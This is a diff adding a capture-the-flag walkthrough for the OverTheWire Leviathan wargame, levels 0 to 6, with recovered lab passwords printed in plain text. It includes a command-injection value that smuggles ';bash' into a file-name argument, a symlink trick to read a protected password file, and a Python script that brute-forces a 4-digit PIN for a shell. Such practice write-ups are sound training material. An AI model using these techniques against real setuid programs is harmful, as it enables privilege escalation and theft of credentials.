@@ -1,0 +1,74 @@
+SSH Information
+Host: leviathan.labs.overthewire.org
+Port: 2223
+ 
+ level 0
+ 1)Use "ls -al" to show al the directories and files.
+ 2)I got a hidden directory .backup.
+ 3)Found a bookmarks.html file.
+ 4)cat bookmarks.html  | grep password
+ 
+ <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+
+5)password for leviathan1 is rioGegei8m.
+
+level 1
+1)there is a executable named check.
+2)upon running this it is asking for password.
+3)So i used strings command, but didn't got anything.
+4)Then used ltrace ./check and got strcmp("hel", "sex").
+5)"sex" was the password.
+6)giving the password 'sex' gives the /bin/sh shell.
+7)/leviathan_pass/leviathan2
+ougahZi8Ta
+
+level 2
+
+1)/printfile /tmp/lv3tmp/temp\;bash
+
+2)cat /etc/leviathan_pass/leviathan3
+Ahdiemoo1j
+
+level 3
+1)Upon running ltrace ./level3
+I saw that a string comaprison with "snlprintf\n"
+2)So  passed snlprintf as password.
+3)cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+
+level 4
+1)la -al
+I saw .trash folder
+2)It contained executable named bin.
+3)upon running it gave some binary text.
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+4)Then i converted it to ascii.
+Tith4cokei
+5)This was the password for level 5.
+
+
+level 5
+1)move to /tmp and create a symbolic link
+ln -s /etc/leviathan_pass/leviathan6 file.log
+2)Then run the leviathan5 executable. 
+3)I got the password for user leviathan6.
+UgaoFee4li
+
+level 6
+
+1)Crete a script in /tmp/temm6 directory
+#!/usr/bin/python3
+import os
+from itertools import product
+
+chars = '0123456789' # chars to look for
+length=4
+#for length in range(1, 4): # only do lengths of 1 + 2
+to_attempt = product(chars, repeat=length)
+for attempt in to_attempt:
+        p=''.join(attempt)
+        os.system("~/./leviathan6 "+p)
+
+ 2)run the script. Upons giving correct pin we will get shell of user leviathan7.
+ 3)cat /etc/leviathan_pass/leviathan7 
+ ahy7MaeBo9
